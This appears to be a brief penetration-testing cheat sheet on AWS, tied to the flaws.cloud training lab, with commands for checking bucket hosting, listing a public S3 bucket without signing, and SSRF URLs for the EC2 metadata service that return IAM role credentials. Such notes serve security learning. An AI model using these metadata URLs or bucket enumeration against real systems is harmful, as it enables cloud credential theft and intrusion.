AWS
===

## Check if domain is on a bucket
```
$ dig +nocmd flaws.cloud any +multiline +noall +answer
```

## List a bucket
```
$ aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
```

## Ressources
http://flaws.cloud/

## SSRF on AWS to get credentials
On AWS there is a metadata server that can be accessed through the REST API located at: `http://169.254.169.254`. Sending a GET requests to the following endpoint will dump a list of roles that are attaches to the current EC2 instance.

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```